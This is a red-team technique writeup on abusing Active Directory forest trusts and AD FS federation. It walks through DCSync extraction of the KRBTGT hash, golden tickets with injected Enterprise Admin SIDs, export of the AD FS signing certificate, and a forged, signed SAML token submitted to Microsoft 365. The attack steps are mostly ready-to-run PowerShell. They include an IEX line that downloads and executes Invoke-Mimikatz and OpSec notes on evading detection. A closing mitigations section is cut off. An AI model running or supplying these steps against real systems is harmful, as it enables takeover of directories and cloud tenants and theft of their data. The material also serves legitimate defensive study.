# [PE-POLICY-006]: Federation Trust Relationship Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-POLICY-006 |
| **MITRE ATT&CK v18.1** | [T1484.002](https://attack.mitre.org/techniques/T1484/002/) (Domain or Tenant Policy Modification: Trust Modification) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Hybrid AD / Windows Active Directory |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2012-2025 (all versions); AD FS 2.0+ |
| **Patched In** | N/A - Architectural issue; mitigations required |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Federation trust relationships between Active Directory forests (forest trusts) and AD FS (Active Directory Federated Services) implementations enable organizations to extend authentication and authorization across organizational boundaries. These trust relationships are built on shared secrets (trust passwords) and cryptographic signing certificates. An attacker who gains access to a trusting domain can exploit the trust relationship in multiple ways: (1) forge Kerberos tickets with arbitrary SID history to bypass SID filtering and access resources in the trusted forest, (2) modify trust properties to disable SID filtering and enable cross-forest privilege escalation, or (3) compromise the AD FS signing certificate and forge SAML tokens to impersonate any user across federated services and external tenants (Golden SAML attack). Each of these approaches bypasses traditional authentication and authorization controls, granting the attacker domain admin or enterprise admin access to multiple forests.

**Attack Surface:** Trust Trusted Domain Objects (TDO) and their properties (trustAttributes, trustType, trustDirection), trust passwords stored in Active Directory, AD FS server configurations and signing certificates, Kerberos inter-realm TGTs (Ticket Granting Tickets), and SAML token signing infrastructure.

**Business Impact:** **Complete compromise of multiple Active Directory forests and federated identity systems.** An attacker can impersonate any user (including Global Admins in federated M365 tenants), modify enterprise-wide policies, access sensitive data across organizational boundaries, and establish long-term persistence that survives incident response efforts. A single compromised domain can cascade to compromise dozens of partner organizations if they share federation relationships.

**Technical Context:** Exploiting trust relationships typically requires Domain Admin access in at least one domain, but once obtained, escalation to Enterprise Admin or cross-forest compromise is automatic. The most dangerous variants (SID history spoofing and Golden SAML) require extracting cryptographic material (KRBTGT password hash for Kerberos or AD FS certificate + DKM key for SAML), which is accessible only to Domain Admins. However, once extracted, these materials can be reused indefinitely, providing persistent access mechanisms that survive password changes. Detection requires specialized monitoring of trust relationship modifications, Kerberos inter-realm TGT requests, and SAML token issuance patterns.

### Operational Risk

- **Execution Risk:** Medium - Requires Domain Admin or higher access; mitigation complexity varies by trust configuration.
- **Stealth:** High - Legitimate admin activity for trusted inter-forest operations; difficult to distinguish malicious activity.
- **Reversibility:** Poor - Requires trust renegotiation or certificate rotation; lengthy process affecting business operations.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | AD Foundations 4.1, 5.2 | Audit trust relationships regularly; manage trust security settings |
| **DISA STIG** | WN10-AU-000095 | Ensure Kerberos inter-realm authentication events are audited |
| **CISA SCuBA** | Auth-1 | Require strong cryptographic controls for authentication across trust boundaries |
| **NIST 800-53** | AC-3, IA-5, SC-7 | Access Control; Authentication; Boundary Protection |
| **GDPR** | Art. 32, Art. 33 | Security of Processing; Personal Data Breach Notification |
| **DORA** | Art. 9, Art. 15 | ICT infrastructure security; incident disclosure |
| **NIS2** | Art. 21 | Cyber Risk Management – access control across enterprise boundaries |
| **ISO 27001** | A.9.2.5, A.9.4 | Inter-organizational access control; access rights review |
| **ISO 27005** | Risk Scenario | Compromise of inter-organizational access; cryptographic key compromise |

---

## 2. DETAILED EXECUTION METHODS

### METHOD 1: SID History Spoofing via Forest Trust Exploitation

**Supported Versions:** Windows Server 2012-2025

#### Step 1: Enumerate Forest Trusts and Trust Properties

**Objective:** Identify and characterize forest trust relationships, focusing on SID filtering configuration weaknesses.

**Command:**
```powershell
# Enumerate all forest trusts from current domain
Get-ADTrust -Filter "trustDirection -eq 'Bidirectional' -or trustDirection -eq 'Inbound'" | 
  Select-Object Name, Direction, TrustType, TrustAttributes, Description | 
  Format-Table

# Check for trusts with weak SID filtering (TREAT_AS_EXTERNAL flag = 0x40 indicates external trust SID filtering)
Get-ADTrust -Filter * | ForEach-Object {
    $Trust = $_
    $TrustAttrs = $Trust.TrustAttributes
    
    # Check for QUARANTINED_DOMAIN (0x4) and TREAT_AS_EXTERNAL (0x40)
    if (($TrustAttrs -band 0x4) -eq 0) {
        Write-Host "VULNERABLE: $($Trust.Name) - SID Filtering NOT enabled (Quarantine flag missing)"
    }
    if (($TrustAttrs -band 0x40) -ne 0) {
        Write-Host "WEAK: $($Trust.Name) - TREAT_AS_EXTERNAL flag set; using external trust SID filtering"
    }
}

# Enumerate the target forest's root domain SID
$TargetForest = "trusted-forest.com"
$TargetDomain = (Get-ADDomain -Server $TargetForest).DNSRoot
$TargetDomainSid = (Get-ADDomain -Server $TargetDomain).DomainSID
Write-Host "Target forest SID: $TargetDomainSid"

# Find Enterprise Admins group in target forest
$EnterpriseAdminsRid = "519"
$EnterpriseAdminsSid = "$TargetDomainSid-$EnterpriseAdminsRid"
Write-Host "Enterprise Admins SID: $EnterpriseAdminsSid"
```

**Expected Output:**
```
VULNERABLE: trusted-forest.com - SID Filtering NOT enabled (Quarantine flag missing)
WEAK: partner-forest.org - TREAT_AS_EXTERNAL flag set
Target forest SID: S-1-5-21-3623811015-3361044348-30300820
Enterprise Admins SID: S-1-5-21-3623811015-3361044348-30300820-519
```

**What This Means:**
- Identifies forest trusts without proper SID filtering
- Confirms target forest and privilege group identifiers
- TREAT_AS_EXTERNAL flag indicates relaxed filtering (RID >= 1000 only)

**OpSec & Evasion:**
- Enumeration uses standard Active Directory queries; minimal audit logging
- Discovery of trust properties creates Event ID 4660 if auditing is enabled, but is normal admin activity
- Detection likelihood: Low (unless actively monitoring for trust enumeration patterns)

**Troubleshooting:**
- **Error:** Access Denied - Insufficient permissions
  - **Cause:** User lacks Active Directory read permissions
  - **Fix:** Run as Domain Admin or user with "List Contents" permissions on Trusted Domain objects

**References & Proofs:**
- [Dirk-Jan Mollema's Forest Trust Analysis](https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/)
- [SpecterOps BloodHound Trust Edges](https://specterops.io/blog/2025/06/25/good-fences-make-good-neighbors-new-ad-trusts-attack-paths-in-bloodhound/)
- [Microsoft AD Trust Documentation](https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust)

---

#### Step 2: Obtain KRBTGT Password Hash from Current Domain

**Objective:** Extract the KRBTGT account password hash to enable forging inter-realm TGTs with arbitrary SID history.

**Command:**
```powershell
# Dump KRBTGT password hash using DCSync (requires Domain Admin)
# Using Mimikatz DCSync functionality (requires DA privileges)

# Method 1: Using Invoke-Mimikatz (if available)
# This requires Mimikatz in PowerShell context
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Invoke-Mimikatz.ps1')

Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt@domain.com /domain:domain.com /csv"'

# Method 2: Using DSInternals PowerShell Module (native, no Mimikatz required)
# Install-Module DSInternals -Scope CurrentUser -Force

Import-Module DSInternals

# Get the KRBTGT object
$KrbTgtAccount = Get-ADUser -Filter { sAMAccountName -eq 'krbtgt' } -Properties ObjectSid, userAccountControl
$KrbTgtObjectSid = $KrbTgtAccount.ObjectSid

# Extract the password hash from the directory
# This requires replication rights (DCSync or similar)
$KrbTgtHash = Get-ADReplAccount -SamAccountName "krbtgt" | Select-Object SamAccountName, NTHash

Write-Host "KRBTGT Hash (NT): $($KrbTgtHash.NTHash)"
Write-Host "KRBTGT SID: $($KrbTgtObjectSid)"

# Store for later use in golden ticket creation
$KrbTgtNTHash = $KrbTgtHash.NTHash
```

**Expected Output:**
```
KRBTGT Hash (NT): aad3c435b514a4eeaad3b435b514a4ee
KRBTGT SID: S-1-5-21-3623811015-3361044348-30300820-502
```

**What This Means:**
- KRBTGT password hash is obtained; can be used to forge any Kerberos ticket in the domain
- Hash is typically 32-character hex string (MD4/NT hash)
- This hash persists across password changes if attacker maintains backdoor access

**OpSec & Evasion:**
- DCSync generates Event ID 4662 (Directory Service Access) if auditing is enabled
- Using legitimate admin tools (DSInternals) blends in with normal domain administration
- Mimikatz may trigger endpoint detection if running unsigned from untrusted source
- Detection likelihood: Medium (if SIEM correlates Event ID 4662 with KRBTGT queries)

**Troubleshooting:**
- **Error:** Access Denied - DCSync requires replication rights
  - **Cause:** User does not have "Replicate Directory Changes" permission
  - **Fix:** Ensure user is Domain Admin or has explicit replication rights granted

**References & Proofs:**
- [DSInternals Module](https://github.com/MichaelGrafnetter/DSInternals)
- [Mimikatz DCSync Documentation](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)

---

#### Step 3: Create Inter-Realm TGT with SID History Injection

**Objective:** Forge a Kerberos TGT that includes a crafted SID history containing Enterprise Admin SID of the target forest, bypassing SID filtering if weak.

**Command:**
```powershell
# Create a golden ticket with injected SID history for cross-forest escalation
# Using impacket's ticketer.py (Python)

# Setup:
# 1. Export KRBTGT hash from current domain (from Step 2)
# 2. Identify target forest Enterprise Admins SID
# 3. Use ticketer.py to create inter-realm TGT

$KrbTgtHash = "aad3c435b514a4eeaad3b435b514a4ee"  # From Step 2
$SourceDomain = "source.local"
$SourceDomainSid = "S-1-5-21-3623811015-3361044348-30300820"
$TargetForestSid = "S-1-5-21-1234567890-1234567890-1234567890"  # Target forest root domain SID
$TargetEnterpriseAdminsSid = "$TargetForestSid-519"
$TargetKrbtgtRid = "502"
$TargetKrbtgtSid = "$TargetForestSid-$TargetKrbtgtRid"

# Using Python impacket (run from Linux/WSL)
$PythonCommand = @"
from impacket.examples import ticketer
import base64

# Create a golden ticket with SID history
ticket = ticketer.create_tgt(
    domain_name='$SourceDomain',
    domain_sid='$SourceDomainSid',
    user_name='Administrator',
    user_id=500,
    krbtgt_hash='$KrbTgtHash',
    extra_sids=['$TargetEnterpriseAdminsSid'],
    duration=43200  # 12 hours
)

print(f"Created inter-realm TGT: {base64.b64encode(ticket).decode()}")
"@

# Save and execute (requires impacket installed)
# python3 -c $PythonCommand

# Alternative: Using Rubeus (C# tool, Windows native)
# .\Rubeus.exe golden /domain:source.local /user:Administrator /sid:S-1-5-21-3623811015-3361044348-30300820 `
#   /krbtgt:aad3c435b514a4eeaad3b435b514a4ee /sids:S-1-5-21-1234567890-1234567890-1234567890-519 /ticket:tgt.kirbi

Write-Host "Inter-realm TGT with SID history injected: $TargetEnterpriseAdminsSid"
```

**Expected Output:**
```
Inter-realm TGT with SID history injected: S-1-5-21-1234567890-1234567890-1234567890-519
TGT encoded and ready for use
```

**What This Means:**
- Forged TGT includes arbitrary SID history pointing to target forest privilege group
- If target forest has weak SID filtering, this SID will be accepted during validation
- Attacker can now present this TGT to resources in target forest as Enterprise Admin

**OpSec & Evasion:**
- Ticket creation is local and generates no network traffic or logs
- Using the ticket generates Kerberos pre-authentication traffic; typical for legitimate inter-forest authentication
- SID history abuse may be detected if correlation-based detection is enabled
- Detection likelihood: Medium-High (if proper Kerberos auditing is enabled)

**Troubleshooting:**
- **Error:** Invalid domain SID format
  - **Cause:** Domain SID is malformed or incorrect
  - **Fix:** Verify SID using `(Get-ADDomain).DomainSID` in PowerShell
- **Error:** Ticket rejection at target domain controller
  - **Cause:** Target forest has enabled SID filtering (QUARANTINED_DOMAIN flag)
  - **Fix:** Technique only works on forests with weak trust configurations

**References & Proofs:**
- [Impacket Ticketer Script](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [Rubeus Golden Ticket Documentation](https://github.com/GhostPack/Rubeus)

---

#### Step 4: Authenticate to Target Forest with Forged TGT

**Objective:** Use the forged inter-realm TGT to authenticate to the target forest and access resources as Enterprise Admin.

**Command:**
```powershell
# Inject the forged TGT into current session
# Using Mimikatz or Rubeus

# Method 1: Using Mimikatz
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Invoke-Mimikatz.ps1')

# Inject the ticket (kirbi file from Step 3)
Invoke-Mimikatz -Command '"kerberos::ptt c:\temp\tgt.kirbi"'

# Method 2: Using Rubeus
# .\Rubeus.exe ptt /ticket:tgt.kirbi

# Verify ticket injection
Invoke-Mimikatz -Command '"kerberos::list"'

# Now test access to target forest resources
$TargetDC = "dc.target-forest.com"
$TargetDomainDN = "DC=target-forest,DC=com"

# Verify Enterprise Admin access
Get-ADUser -Filter { Name -eq "Administrator" } -Server $TargetDC | Select-Object Name, SamAccountName

# Enumerate sensitive groups in target forest (now with EA privileges)
Get-ADGroup -Filter { Name -like "Enterprise*" } -Server $TargetDC | Format-Table Name, SID

# Attempt to modify target forest resources (proof of compromise)
# For example: Add current user to Enterprise Admins group
# Add-ADGroupMember -Identity "Enterprise Admins" -Members "DOMAIN\AttackerAdmin" -Server $TargetDC

Write-Host "Successfully authenticated to target forest as Enterprise Admin"
```

**Expected Output:**
```
Name                 SamAccountName
----                 ----
Administrator        Administrator

Name                                    SID
----                                    ----
Enterprise Admins                       S-1-5-21-1234567890-1234567890-1234567890-519
Schema Admins                           S-1-5-21-1234567890-1234567890-1234567890-518

Successfully authenticated to target forest as Enterprise Admin
```

**What This Means:**
- Forged ticket successfully accepted by target forest domain controller
- SID history injection bypassed SID filtering
- Attacker now has Enterprise Admin permissions across all domains in target forest
- All actions appear to come from legitimate administrator account

**OpSec & Evasion:**
- Ticket injection is local, no network detection possible at injection point
- Kerberos traffic to target forest appears legitimate (encrypted with target krbtgt hash)
- Resource access generates normal audit events but under impersonated admin identity
- Detection likelihood: Low-Medium (unless cross-forest Kerberos traffic is monitored)

**Troubleshooting:**
- **Error:** Ticket Granting Service request rejected by target DC
  - **Cause:** Target forest still has SID filtering enabled despite weak attributes
  - **Fix:** Verify trust configuration; may require fallback to Golden SAML method

**References & Proofs:**
- [Kerberos Ticket Injection Techniques](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos)

---

### METHOD 2: Golden SAML Attack (AD FS Certificate Compromise)

**Supported Versions:** Windows Server 2012 R2+ (AD FS 2.0+); M365/Azure AD integration

#### Step 1: Compromise AD FS Server and Extract Signing Certificate

**Objective:** Obtain ADFS server credentials and extract the token signing certificate with private key.

**Command:**
```powershell
# Requires: Domain Admin access and remote access to AD FS server

# Step 1a: Connect to AD FS server as admin
$ADFSServer = "adfs.company.com"
$ADFSAdminSession = New-PSSession -ComputerName $ADFSServer -Credential (Get-Credential)

# Step 1b: Export AD FS configuration and encryption key (requires AD FS admin rights)
Invoke-Command -Session $ADFSAdminSession -ScriptBlock {
    # Load AADInternals module (or manually download)
    # Install-Module AADInternals -Force
    
    Import-Module AADInternals
    
    # Export AD FS configuration
    $ADFSConfig = Export-AADIntADFSConfiguration -Local
    
    # Export encryption key (requires AD access from AD FS server)
    $ADFSKey = Export-AADIntADFSEncryptionKey -Local -Configuration $ADFSConfig
    
    # Export certificates (both signing and encryption)
    Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $ADFSKey -Path "C:\temp\"
    
    # List exported certificates
    Get-ChildItem C:\temp\ -Filter "*.pfx" -o Name
}

# Step 1c: Transfer certificates to attacker machine
$CertFile = Get-Item \\$ADFSServer\c$\temp\ADFS_Signing_Token.pfx
Copy-Item $CertFile -Destination C:\temp\ADFS_Signing_Token.pfx

# Step 1d: Parse certificate to get DKM key and private key
$CertPassword = ConvertTo-SecureString -String "password" -AsPlainText -Force
$ADFSCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
$ADFSCert.Import("C:\temp\ADFS_Signing_Token.pfx", $CertPassword, "Exportable")

# Extract certificate thumbprint and issuer
Write-Host "ADFS Signing Certificate Thumbprint: $($ADFSCert.Thumbprint)"
Write-Host "Issued By: $($ADFSCert.Issuer)"
Write-Host "Valid From: $($ADFSCert.NotBefore)"
Write-Host "Valid To: $($ADFSCert.NotAfter)"
```

**Expected Output:**
```
ADFS Signing Certificate Thumbprint: 3A7F4B9C2E1D5F8A6C4E9B3D2F7A1C5E
Issued By: CN=ADFS,OU=Security,DC=company,DC=com
Valid From: 01/01/2024
Valid To: 01/01/2026
```

**What This Means:**
- ADFS signing certificate extracted with private key
- Certificate can be used to forge SAML tokens indefinitely
- Persistence is achieved: attacker can forge credentials even if domain admin access is lost

**OpSec & Evasion:**
- Requires admin access to AD FS server; already high privilege
- Certificate export may be logged by AD FS if auditing is enabled
- Detection likelihood: Medium (Event ID 33205 in AD FS admin logs if enabled)

**Troubleshooting:**
- **Error:** Access Denied - AADInternals module requires SYSTEM context
  - **Cause:** Running as regular admin instead of SYSTEM
  - **Fix:** Use PsExec or Invoke-Command with admin credentials

**References & Proofs:**
- [AADInternals ADFS Export](https://aadinternals.com/post/adfs/)

---

#### Step 2: Create Forged SAML Token

**Objective:** Craft a fraudulent SAML token signed with the stolen ADFS certificate to impersonate any user.

**Command:**
```powershell
# Create forged SAML token using stolen AD FS certificate
# Using Mandiant ADFSpoof tool or similar

# Prerequisites:
# 1. Stolen ADFS signing certificate (from Step 1)
# 2. Target user's ImmutableId from Azure AD
# 3. AD FS issuer URI

# Step 2a: Get target user's ImmutableId
Connect-MgGraph -Scopes "User.Read.All"
$TargetUser = Get-MgUser -Filter "userPrincipalName eq 'admin@company.com'" -Property OnPremisesImmutableId
$ImmutableId = $TargetUser.OnPremisesImmutableId

Write-Host "Target User ImmutableId: $ImmutableId"

# Step 2b: Get AD FS issuer URI
$ADFSProperties = Get-MsolFederationSettings -DomainName "company.com"
$IssuerUri = $ADFSProperties.IssuerUri

Write-Host "AD FS Issuer URI: $IssuerUri"

# Step 2c: Create SAML token using ADFSpoof (Python/C#)
# This requires the ADFSpoof tool (part of Mandiant's toolkit)
# Manual SAML creation:

$SAMLTemplate = @"
<samlp:Response ID="_$(New-Guid)" Version="2.0" IssueInstant="$(Get-Date -Format u)z" 
  Destination="https://login.microsoftonline.com/login.srf" 
  Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified"
  xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">$IssuerUri</Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
  </samlp:Status>
  <saml:Assertion Version="2.0" ID="_$(New-Guid)" IssueInstant="$(Get-Date -Format u)z"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Issuer>$IssuerUri</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@company.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="$(([datetime]::Now).AddHours(1).ToString('u'))Z" 
          Recipient="https://login.microsoftonline.com/login.srf" />
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="$(([datetime]::Now).AddMinutes(-5).ToString('u'))Z" 
      NotOnOrAfter="$(([datetime]::Now).AddHours(1).ToString('u'))Z">
      <saml:AudienceRestriction>
        <saml:Audience>urn:federation:MicrosoftOnline</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="$(Get-Date -Format u)z" SessionIndex="_$(New-Guid)">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="ImmutableID"><saml:AttributeValue>$ImmutableId</saml:AttributeValue></saml:Attribute>
      <saml:Attribute Name="UPN"><saml:AttributeValue>admin@company.com</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
"@

# Save SAML template
$SAMLTemplate | Out-File -FilePath "C:\temp\saml_template.xml" -Encoding UTF8

Write-Host "SAML token template created and ready for signing"
```

**Expected Output:**
```
SAML token template created and ready for signing
ImmutableId: abc123def456ghi789
AD FS Issuer URI: https://adfs.company.com/adfs/services/trust
```

**What This Means:**
- SAML template created with target user identity and AD FS issuer
- Template will be cryptographically signed with stolen certificate
- Resulting token can be used to authenticate to any federated service (O365, AWS, custom apps)

**OpSec & Evasion:**
- SAML token creation is local, no network activity
- No logs generated by AD FS for forged token creation
- Detection likelihood: Low (until token is used)

**Troubleshooting:**
- **Error:** ImmutableId not found for user
  - **Cause:** User may not be synced from on-premises AD
  - **Fix:** Use alternative identifiers (UPN, ObjectId)

**References & Proofs:**
- [SAML Token Forging](https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs)

---

#### Step 3: Sign Forged SAML Token with Stolen Certificate

**Objective:** Cryptographically sign the SAML token with the stolen AD FS certificate private key.

**Command:**
```powershell
# Sign the SAML token with stolen certificate
# Using .NET cryptographic APIs or dedicated tools

# Load certificate with private key
$CertPath = "C:\temp\ADFS_Signing_Token.pfx"
$CertPassword = ConvertTo-SecureString -String "password" -AsPlainText -Force
$Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
$Cert.Import($CertPath, $CertPassword, "Exportable")

# Load SAML template
$SAMLContent = Get-Content -Path "C:\temp\saml_template.xml" -Raw

# Get the private key
$PrivateKey = $Cert.PrivateKey

# Sign the assertion
$XMLDoc = New-Object System.Xml.XmlDocument
$XMLDoc.LoadXml($SAMLContent)

# Create signature
$SignatureMethod = "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"
$DigestMethod = "http://www.w3.org/2001/04/xmlenc#sha256"

$RSAKey = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($Cert)
$SignedXML = New-Object System.Security.Cryptography.Xml.SignedXml($XMLDoc)
$SignedXML.SigningKey = $RSAKey
$SignedXML.SignedInfo.SignatureMethod = $SignatureMethod
$SignedXML.SignedInfo.CanonicalizationMethod = "http://www.w3.org/2001/10/xml-exc-c14n#"

# Reference the assertion to sign
$Reference = New-Object System.Security.Cryptography.Xml.Reference
$Reference.Uri = "#_" + ($XMLDoc.DocumentElement.GetAttribute("ID"))
$Reference.DigestMethod = $DigestMethod
$Transform = New-Object System.Security.Cryptography.Xml.XmlDsigExcC14NTransform
$Reference.AddTransform($Transform)
$SignedXML.AddReference($Reference)

# Compute signature
$SignedXML.ComputeSignature()

# Append signature to assertion
$Signature = $SignedXML.GetXml()
$XMLDoc.DocumentElement.AppendChild($XMLDoc.ImportNode($Signature, $true)) | Out-Null

# Export signed SAML token
$SignedSAML = $XMLDoc.OuterXml
$SignedSAML | Out-File -FilePath "C:\temp\saml_signed.xml" -Encoding UTF8

# Encode for use in HTTP requests
$SAMLBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($SignedSAML))
Write-Host "Signed SAML Token (Base64): $($SAMLBase64.Substring(0, 100))..."
Write-Host "Token saved to: C:\temp\saml_signed.xml"
```

**Expected Output:**
```
Signed SAML Token (Base64): PHNhbWxwOlJlc3BvbnNlIElEPSJfMjhlZjk1MzItOTBk...
Token saved to: C:\temp\saml_signed.xml
```

**What This Means:**
- SAML token cryptographically signed with AD FS private key
- Signature is mathematically valid and will pass cryptographic verification
- Token can now be used to authenticate to any service trusting AD FS

**OpSec & Evasion:**
- Signing is local operation; no network activity
- No logs generated; undetectable at this stage
- Detection likelihood: Very Low (until token is used for authentication)

**Troubleshooting:**
- **Error:** Private key not found in certificate
  - **Cause:** Certificate imported without private key flag
  - **Fix:** Re-import certificate with "Exportable" flag

**References & Proofs:**
- [XML Digital Signature Creation](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.xml.signedxml)

---

#### Step 4: Authenticate to Federated Services Using Forged SAML Token

**Objective:** Use the forged, signed SAML token to authenticate to M365 or other federated services.

**Command:**
```powershell
# Authenticate to Office 365 using forged SAML token
# Using SAMLClientConnection module or manual HTTPS POST

$SAMLBase64 = "PHNhbWxwOlJlc3BvbnNlI..." # From Step 3

# Create authentication request to Microsoft
$LoginURL = "https://login.microsoftonline.com/login.srf"

# Build POST request body (WS-Federation)
$PostBody = @"
SAMLResponse=$([System.Web.HttpUtility]::UrlEncode($SAMLBase64))&RelayState=https%3A%2F%2Fportal.office.com%2F
"@

# Send forged token to Microsoft
$Response = Invoke-WebRequest -Uri $LoginURL -Method POST -Body $PostBody -ContentType "application/x-www-form-urlencoded" -SessionVariable "Office365Session"

# If successful, parse the response for authentication cookie
$Cookies = $Office365Session.Cookies.GetCookies("https://portal.office.com")
Write-Host "Authentication cookies obtained: $($Cookies.Count) cookies"

# Verify authentication
$VerifyResponse = Invoke-WebRequest -Uri "https://portal.office.com/admin" -WebSession $Office365Session

if ($VerifyResponse.StatusCode -eq 200) {
    Write-Host "✓ Successfully authenticated to Office 365 as admin@company.com"
    Write-Host "✓ Attacker now has global admin access to all M365 services"
} else {
    Write-Host "✗ Authentication failed"
}

# Use authenticated session to:
# 1. Enumerate O365 users and resources
# 2. Extract sensitive data (emails, files)
# 3. Create backdoor admin accounts
# 4. Modify security settings
Get-MgUser -First 10 | Select-Object UserPrincipalName, DisplayName
```

**Expected Output:**
```
Authentication cookies obtained: 2 cookies
✓ Successfully authenticated to Office 365 as admin@company.com
✓ Attacker now has global admin access to all M365 services

UserPrincipalName         DisplayName
admin@company.com         Global Administrator
user1@company.com         John Doe
user2@company.com         Jane Smith
...
```

**What This Means:**
- Forged SAML token accepted by Microsoft authentication server
- Attacker now authenticated as Global Admin to entire M365 tenant
- Can perform any action a legitimate global admin can perform
- Persistence achieved: token can be regenerated indefinitely

**OpSec & Evasion:**
- Authentication appears legitimate; comes from federated AD FS
- M365 audit logs show login from federated user
- No indication that token was forged rather than legitimately issued
- Detection likelihood: Low (unless correlation between AD FS logs and M365 activity)

**Troubleshooting:**
- **Error:** SAML validation fails - signature verification failed
  - **Cause:** Certificate used for signing does not match AD FS certificate in M365
  - **Fix:** Verify correct certificate was extracted in Step 1
- **Error:** Token expired
  - **Cause:** NotOnOrAfter timestamp in SAML has passed
  - **Fix:** Recreate token with future expiration time

**References & Proofs:**
- [WS-Federation Protocol](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/understanding-key-ad-fs-concepts)
- [SAML Authentication Flow](https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs)

---

## 3. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Enable and Monitor Trust Password Changes:**
    Implement automated alerting for trust password modifications and ensure TDO passwords are changed every 30 days (or more frequently). Monitor for suspicious trust password resets that deviate from regular schedule.
    
    **Applies To Versions:** All Windows Server 2012+
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Monitor trust password change history
    Get-ADTrust -Filter * | ForEach-Object {
        $Trust = $_
        $TrustPwd = Get-ADObject -Filter { sAMAccountName -eq "$($Trust.Name)$" } -Properties pwdLastSet
        $LastPwdChange = [datetime]::FromFileTime($TrustPwd.pwdLastSet)
        $DaysSinceChange = (Get-Date) - $LastPwdChange
        
        if ($DaysSinceChange.Days -gt 35) {
            Write-Host "ALERT: Trust '$($Trust.Name)' password not changed in $($DaysSinceChange.Days) days"
        }
    }
    
    # Force immediate trust password change
    netdom trust source.local /Domain:target.local /UserD:target\Administrator /PasswordD:* `
      /UserO:source\Administrator /PasswordO:* /Verify:Both /Transitive
    ```
    
    **Validation Command:**
    ```powershell
    # Verify trust health
    nltest /domain_trust
    ```

*   **Implement Strict SID Filtering for All Inter-Forest Trusts:**
    Enable QUARANTINED_DOMAIN flag on all forest trusts to enforce strict SID filtering, preventing SID history spoofing attacks.
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Enable QUARANTINED_DOMAIN flag on forest trusts
    # This requires reestablishing the trust relationship
    
    # Get current trust
    $Trust = Get-ADTrust -Identity "target-forest.com"
    $CurrentAttrs = $Trust.TrustAttributes
    
    # Check if QUARANTINED_DOMAIN (0x4) is already set
    if (($CurrentAttrs -band 0x4) -eq 0) {
        Write-Host "QUARANTINED_DOMAIN flag not set; enabling..."
        
        # Reset trust with proper flags (requires admin on both sides)
        netdom trust source.local /Domain:target.local /UserD:target\Administrator /PasswordD:* `
          /UserO:source\Administrator /PasswordO:* /Reset /ForestTransitive
        
        Write-Host "Trust reset complete; QUARANTINED_DOMAIN should now be enabled"
    }
    ```
    
    **Validation Command:**
    ```powershell
    Get-ADTrust -Filter "trustDirection -eq 'Bidirectional'" | `
      Select-Object Name, @{Label="QuarantinedDomain";Expression={$_.TrustAttributes -band 0x4}} | `
      Format-Table
    ```

*   **Disable or Isolate AD FS Servers:**
    If AD FS is deployed, implement strict network segmentation and access controls. Restrict administrative access to AD FS servers; require MFA for all admin sessions. Rotate AD FS signing certificates on a quarterly basis.
    
    **Manual Steps (Azure Portal + PowerShell):**
    ```powershell
    # Configure AD FS to require MFA for sensitive operations
    Set-AdfsAdditionalAuthenticationRule -AdditionalAuthenticationRules `
      '@c:[type == "http://schemas.microsoft.com/claims/authnmethodsreferences", value == "Forms"] `
       => issue(type = "http://schemas.microsoft.com/claims/authnmethodsreferences", value = "Forms,Mfa");'
    
    # Rotate AD FS signing certificates
    Update-AdfsCertificate -CertificateType "Token-Signing" -Urgent
    
    # Monitor for unauthorized certificate access
    # Enable auditing on AD FS DKM container
    Get-Acl "AD:\CN=ADFS,CN=Microsoft,CN=Program Data,DC=company,DC=com" | Get-AuditRule
    ```

*   **Implement Conditional Access for Cross-Forest/Federation Access:**
    Require additional authentication factors for authentication requests that cross forest boundaries or come through federation layers.
    
    **Manual Steps (Hybrid Environment):**
    ```powershell
    # Create Conditional Access policy for federated authentication
